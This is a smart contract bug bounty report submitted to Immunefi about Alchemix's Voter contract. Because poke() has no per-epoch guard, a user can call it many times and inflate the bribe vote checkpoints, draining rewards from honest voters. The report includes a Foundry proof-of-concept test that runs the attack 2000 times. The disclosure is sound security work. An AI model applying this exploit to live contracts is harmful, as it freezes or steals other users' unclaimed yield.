# 31163 - \[SC - Critical] Malicious actor can acquire bribe rewards by bl...

Submitted on May 13th 2024 at 20:01:40 UTC by @DuckAstronomer for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31163

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol>

Impacts:

* Permanent freezing of unclaimed yield
* Theft of unclaimed yield

## Description

## Vulnerability Details

The `Voter` contract uses the `onlyNewEpoch` modifier for the `reset()` and `vote()` external functions, which prevents users from voting multiple times or revoting in the same epoch.

However, the `poke()` function is missing the `onlyNewEpoch` modifier, allowing the user to call it multiple times during an epoch. When `poke()` is invoked, it internally calls `_vote()` which resets previous votes first (<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol#L413>) and then proceeds to apply the same amount of votes.

The `_reset()` function perform the withdrawal of votes from a `Bribe` contract (<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol#L396>), while the `_vote()` function deposit votes back (<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol#L441>).

The `Bribe` contract utilizes the `deposit()` function to checkpoint the voting amount for the current Epoch by invoking `_writeVotingCheckpoint()` (<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Bribe.sol#L313>). However, in the `withdraw()` function, it does not checkpoint the voting amount for the current Epoch. This is acceptable since users are required to vote or reset once in an Epoch. However, this assumption is invalid because of the `poke()` function. Users can call it any number of times in an epoch.

A malicious user can call `poke()` multiple times, inflating the value of votes made for an Epoch. Consequently, when calculating the amount of bribes a benign user should receive, the amount will be significantly lower.

```
_prevSupply = votingCheckpoints[getPriorVotingIndex(_nextEpochStart + DURATION)].votes;

// Prevent divide by zero
if (_prevSupply == 0) {
    _prevSupply = 1;
}
prevRewards.balanceOf = (cp0.balanceOf * tokenRewardsPerEpoch[token][_nextEpochStart]) / _prevSupply;
```

Since the value of `_prevSupply` will be quite big due to multiple calls to `poke()`, the reward (`prevRewards.balanceOf`) will be small. Consequently, reward tokens become trapped in the Bribe contract, causing users to miss out on their rewards.

This way an attacker can discourage users with significant voting power from participating in voting for a specific gauge and then later acquire trapped bribes in the following epochs.

## Impact Details

* Theft of unclaimed yield.
* Permanent freezing of unclaimed yield.

## Proof of Concept

POC scenario:

1. The bad guy has **99** times less voting power than the good guy.
2. The good guy normally should get **99K** of BAL bribes.
3. However, the Bad guys call `poke()` 2000 times.
4. As a result of the attack, the good guy receives 15 times less reward.

Instructions:

1. Put Poc's code from below into the file `src/test/Voting.t.sol` - <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/test/Voting.t.sol>.
2. Run the Poc as follows: `forge test --mp src/test/Voting.t.sol --fork-url URL --fork-block-number BLOCK`

```
function test_poc_ok() public {
    address bad = address(1);
    address good = address(2);

    // The good guy has 99x more voting power
    // The good guy should receive 99x more bribes ...
    uint256 tokenId1 = createVeAlcx(bad, 1 ether, MAXTIME, false);
    uint256 tokenId2 = createVeAlcx(good, 99 ether, MAXTIME, false);

    uint256 initialTimestamp = block.timestamp;

    address bribeAddress = voter.bribes(address(sushiGauge));

    // Add BAL and AURA bribes to sushiGauge
    createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);
    createThirdPartyBribe(bribeAddress, aura, TOKEN_100K);

    address[] memory pools = new address[](1);
    pools[0] = sushiPoolAddress;
    uint256[] memory weights = new uint256[](1);
    weights[0] = 5000;

    address[] memory bribes = new address[](1);
    bribes[0] = address(bribeAddress);
    address[][] memory tokens = new address[][](2);
    tokens[0] = new address[](2);
    tokens[0][0] = bal;
    tokens[0][1] = aura;

    // Good and bad guys votes for sushiPoolAddress
    hevm.prank(good);
    voter.vote(tokenId2, pools, weights, 0);

    hevm.prank(bad);
    voter.vote(tokenId1, pools, weights, 0);

    // Reach the end of the epoch
    hevm.warp(block.timestamp + nextEpoch);

    // Claim bribes for good and bad guys
    hevm.prank(good);
    voter.claimBribes(bribes, tokens, tokenId2);

    hevm.prank(bad);
    voter.claimBribes(bribes, tokens, tokenId1);

    // Fair amount of Bribes for the good guy
    uint256 fairAmount = IERC20(bal).balanceOf(good);

    require(
        fairAmount > TOKEN_100K * 9 / 10
    );
}

function test_poc_not_ok() public {
    address bad = address(1);
    address good = address(2);

    // The good guy has 99x more voting power
    // The good guy should receive 99x more bribes ...
    uint256 tokenId1 = createVeAlcx(bad, 1 ether, MAXTIME, false);
    uint256 tokenId2 = createVeAlcx(good, 99 ether, MAXTIME, false);

    uint256 initialTimestamp = block.timestamp;

    address bribeAddress = voter.bribes(address(sushiGauge));

    // Add BAL and AURA bribes to sushiGauge
    createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);
    createThirdPartyBribe(bribeAddress, aura, TOKEN_100K);

    address[] memory pools = new address[](1);
    pools[0] = sushiPoolAddress;
    uint256[] memory weights = new uint256[](1);
    weights[0] = 5000;

    address[] memory bribes = new address[](1);
    bribes[0] = address(bribeAddress);
    address[][] memory tokens = new address[][](2);
    tokens[0] = new address[](2);
    tokens[0][0] = bal;
    tokens[0][1] = aura;

    // Good and bad guys votes for sushiPoolAddress
    hevm.prank(good);
    voter.vote(tokenId2, pools, weights, 0);

    hevm.prank(bad);
    voter.vote(tokenId1, pools, weights, 0);

    // Bad guy invokes poke() 2000 times in the same epoch
    // this way manipulating votingCheckpoints[lastIndex].votes of Bribes
    // https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Bribe.sol#L255-L261
    hevm.startPrank(bad);
    for (uint i; i < 2000; i++) {
        voter.poke(tokenId1);
    }
    hevm.stopPrank();

    // Reach the end of the epoch
    hevm.warp(block.timestamp + nextEpoch);

    // Claim bribes for good and bad guys
    hevm.prank(good);
    voter.claimBribes(bribes, tokens, tokenId2);

    hevm.prank(bad);
    voter.claimBribes(bribes, tokens, tokenId1);

    uint256 unfairAmount = IERC20(bal).balanceOf(good);

    // The good guy gets 15x less bribes (((
    require(
        unfairAmount * 15 < TOKEN_100K * 9 / 10
    );
}
```
